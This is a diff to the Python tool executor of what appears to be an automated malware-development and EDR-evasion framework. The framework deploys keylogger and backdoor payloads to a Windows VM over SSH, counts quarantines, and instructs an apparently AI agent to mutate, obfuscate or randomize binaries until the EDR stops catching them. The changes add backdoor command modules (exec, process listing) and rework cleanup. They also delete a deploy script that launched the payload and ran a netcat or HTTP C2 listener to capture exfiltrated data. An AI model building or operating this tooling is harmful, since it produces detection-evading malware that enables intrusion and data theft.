@@ -429,6 +429,7 @@ class ToolExecutor:
         self._current_edr = config.get("edr", "unknown")
         self._quarantined_hashes: set[str] = set()
         self._quarantine_streak = 0
+        self._quarantine_limit = 3  # Updated by assemble count
         self._last_assembled_recipe = ""
         self._last_output_dir = ""
         self._failed_obfusc: set[tuple[str, str]] = set()
@@ -632,6 +633,8 @@ class ToolExecutor:
                 _, stdout_ch, stderr_ch = client.exec_command(
                     f"cmd /c {command}", timeout=timeout
                 )
+                stdout_ch.channel.settimeout(timeout)
+                stderr_ch.channel.settimeout(timeout)
                 out = stdout_ch.read().decode("utf-8", errors="replace").replace("\r", "")
                 err = stderr_ch.read().decode("utf-8", errors="replace").replace("\r", "")
                 rc = stdout_ch.channel.recv_exit_status()
@@ -640,7 +643,13 @@ class ToolExecutor:
                 return "", f"SSH exec error: {e}", -1
             finally:
                 client.close()
-        return await asyncio.get_event_loop().run_in_executor(None, _run)
+        try:
+            return await asyncio.wait_for(
+                asyncio.get_event_loop().run_in_executor(None, _run),
+                timeout=timeout + 5  # Extra 5s for overhead
+            )
+        except asyncio.TimeoutError:
+            return "", f"SSH command timed out after {timeout}s", -1
 
     async def _scp_to_vm(self, local_path: str, remote_filename: str,
                          remote_dir: str | None = None) -> bool:
@@ -1135,6 +1144,9 @@ class ToolExecutor:
                             count: int = 1,
                             delivery: list[str] | None = None) -> str:
         count = max(1, min(count, 10))
+        # Set quarantine limit to match variant count
+        self._quarantine_limit = max(count, self._quarantine_limit)
+
         edr = self.config.get("edr", "none").lower()
         if edr != "none":
             if not randomize:
@@ -1485,6 +1497,14 @@ class ToolExecutor:
         recipe["exfil"] = exfil
         recipe["arch"] = arch
 
+        # Auto-add commands for backdoor architectures
+        if "backdoor" in arch:
+            recipe["commands"] = [
+                "commands/cmd_sysinfo",
+                "commands/cmd_processes",
+                "commands/cmd_exec",
+            ]
+
         if def_file:
             recipe["def_file"] = def_file
 
@@ -1609,8 +1629,8 @@ class ToolExecutor:
         with open(local_path, "rb") as f:
             file_hash = hashlib.sha256(f.read()).hexdigest()
 
-        if self._quarantine_streak >= 3:
-            return (f"BLOCKED: {self._quarantine_streak} consecutive quarantines. "
+        if self._quarantine_streak >= self._quarantine_limit:
+            return (f"BLOCKED: {self._quarantine_streak} consecutive quarantines (limit: {self._quarantine_limit}). "
                     f"Your current approach does not work against this EDR.\n"
                     f"You MUST call tool_create_recipe or tool_mutate_recipe with DIFFERENT chunks, "
                     f"then tool_assemble the new recipe BEFORE deploying again.\n"
@@ -1622,7 +1642,13 @@ class ToolExecutor:
                     f"Same bytes = same detection. Change: recipe, evasion chunks, obfuscation, or randomize=true.")
 
         local_size = os.path.getsize(local_path)
-        filename = remote_filename or os.path.basename(local_path)
+        # Generate unique filename to avoid conflicts with locked/leftover files
+        if remote_filename:
+            filename = remote_filename
+        else:
+            base = os.path.basename(local_path)
+            name, ext = os.path.splitext(base)
+            filename = f"{name}_{file_hash[:8]}{ext}"
         deploy_dirs = [
             f"C:\\Users\\{self.vm_user}\\Desktop",
             f"C:\\Users\\{self.vm_user}\\AppData\\Local\\Temp",
@@ -1659,8 +1685,8 @@ class ToolExecutor:
             self._quarantine_locked = True
             self._epoch_failures.append(
                 f"Deploy quarantined: {self._last_recipe} (hash {file_hash[:16]}...)")
-            streak_msg = (f"\nQuarantine streak: {self._quarantine_streak}/3. "
-                          f"{'NEXT DEPLOY BLOCKED — must assemble new recipe first.' if self._quarantine_streak >= 3 else 'Change the binary before retrying.'}")
+            streak_msg = (f"\nQuarantine streak: {self._quarantine_streak}/{self._quarantine_limit}. "
+                          f"{'NEXT DEPLOY BLOCKED — must assemble new recipe first.' if self._quarantine_streak >= self._quarantine_limit else 'Change the binary before retrying.'}")
             detection_details = ""
             try:
                 edr_report = await self.tool_list_edr_events(minutes=2)
@@ -1676,6 +1702,7 @@ class ToolExecutor:
                     f"{streak_msg}{detection_details}")
 
         self._quarantine_streak = 0
+        self._quarantine_locked = False  # Clear lock on successful deploy
         desktop_path = f"C:\\Users\\{self.vm_user}\\Desktop\\{filename}"
         used_fallback = (remote_path != desktop_path)
 
@@ -2177,23 +2204,20 @@ class ToolExecutor:
         subprocess.run(["fuser", "-k", "9001/tcp"], capture_output=True, timeout=5)
         await asyncio.sleep(0.5)
 
-        cleanup_cmds = [
-            'taskkill /f /im payload.exe 2>nul',
-            'taskkill /f /im keylogger.exe 2>nul',
-            'taskkill /f /im backdoor.exe 2>nul',
-            'taskkill /f /im cscript.exe 2>nul',
-            'taskkill /f /im wscript.exe 2>nul',
-            'del "C:\\Users\\vmuser\\Desktop\\*.exe" 2>nul',
-            'del "C:\\Users\\vmuser\\Desktop\\*.js" 2>nul',
-            'del "C:\\Users\\vmuser\\Desktop\\*.vbs" 2>nul',
-            'del "C:\\Users\\vmuser\\Desktop\\*.bat" 2>nul',
-            'taskkill /f /im cmd.exe 2>nul',
-            'schtasks /delete /tn keylog_test /f 2>nul',
-            'schtasks /delete /tn backdoor_test /f 2>nul',
-            'echo CLEANUP_DONE',
-        ]
-        cmd_str = " & ".join(cleanup_cmds)
-        out, err, rc = await self._ssh_exec(cmd_str, timeout=15)
+        # Use PowerShell for more reliable process killing (handles hung processes better)
+        ps_cleanup = (
+            "Get-Process | Where-Object {$_.Path -like '*Desktop*'} | Stop-Process -Force -EA SilentlyContinue; "
+            "Start-Sleep -Seconds 1; "
+            "Remove-Item C:\\Users\\vmuser\\Desktop\\*.exe -Force -EA SilentlyContinue; "
+            "Remove-Item C:\\Users\\vmuser\\Desktop\\*.js -Force -EA SilentlyContinue; "
+            "Remove-Item C:\\Users\\vmuser\\Desktop\\*.vbs -Force -EA SilentlyContinue; "
+            "Remove-Item C:\\Users\\vmuser\\Desktop\\*.bat -Force -EA SilentlyContinue; "
+            "Stop-Process -Name cscript,wscript -Force -EA SilentlyContinue; "
+            "schtasks /delete /tn keylog_test /f 2>$null; "
+            "schtasks /delete /tn backdoor_test /f 2>$null; "
+            "Write-Host CLEANUP_DONE"
+        )
+        out, err, rc = await self._ssh_exec(f'powershell -Command "{ps_cleanup}"', timeout=20)
         if "CLEANUP_DONE" in out:
             logger.info("VM cleaned via SSH")
             return "OK — VM cleaned (processes killed, binaries deleted, tasks removed, C2 listeners reset)"
@@ -2405,73 +2429,8 @@ class ToolExecutor:
         else:
             exec_cmd = f'"C:\\Users\\%VM_USER%\\Desktop\\{payload}"'
 
-        # deploy.sh
-        deploy_sh = f'''#!/bin/bash
-# Deploy script for {recipe_name}
-# Generated by Hermes after successful campaign
-
-VM_PORT=${{VM_PORT:-10022}}
-VM_USER=${{VM_USER:-vmuser}}
-VM_PASS=${{VM_PASS:-vmuser123}}
-C2_PORT=${{C2_PORT:-{c2_port}}}
-TIMEOUT=${{TIMEOUT:-120}}
-DIR="$(cd "$(dirname "$0")" && pwd)"
-
-SSH="sshpass -p '$VM_PASS' ssh -o StrictHostKeyChecking=no -p $VM_PORT $VM_USER@localhost"
-SCP="sshpass -p '$VM_PASS' scp -o StrictHostKeyChecking=no -P $VM_PORT"
-
-echo ""
-echo "=== Deploying {recipe_name} ==="
-echo "  Payload: {payload} ({binary_size} bytes)"
-echo "  C2: {'HTTP' if is_http else 'TCP'} on :$C2_PORT"
-echo ""
-
-# Upload
-echo "[1/4] Uploading..."
-eval $SCP "$DIR/{payload}" "$VM_USER@localhost:'C:\\Users\\$VM_USER\\Desktop\\{payload}'" 2>/dev/null
-if [ $? -ne 0 ]; then echo "FAILED: upload"; exit 1; fi
-
-# Verify not quarantined
-echo "[2/4] Checking quarantine..."
-sleep 2
-EXISTS=$(eval $SSH "'if exist C:\\Users\\$VM_USER\\Desktop\\{payload} (echo EXISTS) else (echo GONE)'" 2>/dev/null | tr -d '\\r')
-if [ "$EXISTS" = "GONE" ]; then
-    echo "QUARANTINED by EDR"
-    exit 2
-fi
-
-# Start C2
-echo "[3/4] Starting C2 listener on :$C2_PORT..."
-fuser -k $C2_PORT/tcp 2>/dev/null
-OUT="$DIR/exfil_$(date +%Y%m%d_%H%M%S).bin"
-'''
-        if is_http:
-            deploy_sh += f'python3 "$DIR/c2_listener.py" $C2_PORT "$OUT" &\n'
-        else:
-            deploy_sh += 'timeout $TIMEOUT nc -l -p $C2_PORT > "$OUT" &\n'
-        deploy_sh += f'''C2_PID=$!
-sleep 1
-
-# Execute
-echo "[4/4] Executing on VM..."
-eval $SSH "'{exec_cmd}'" >/dev/null 2>&1 &
-wait $C2_PID 2>/dev/null
-
-# Results
-SIZE=$(stat -c%s "$OUT" 2>/dev/null || echo 0)
-echo ""
-echo "=== Results ==="
-echo "  C2 data: $SIZE bytes -> $OUT"
-if [ "$SIZE" -gt 100 ]; then
-    echo "  Status: SUCCESS"
-    echo "  Sections:"
-    strings "$OUT" | grep "^===" | sed 's/^/    /'
-else
-    echo "  Status: NO DATA"
-fi
-'''
-        (result_dir / "deploy.sh").write_text(deploy_sh)
-        os.chmod(result_dir / "deploy.sh", 0o755)
+        # Note: deploy.py is created by the assembler with full C2 integration
+        # We only generate standalone c2_listener.py and parse_exfil.py as helpers
 
         # c2_listener.py (HTTP)
         c2_py = f'''#!/usr/bin/env python3
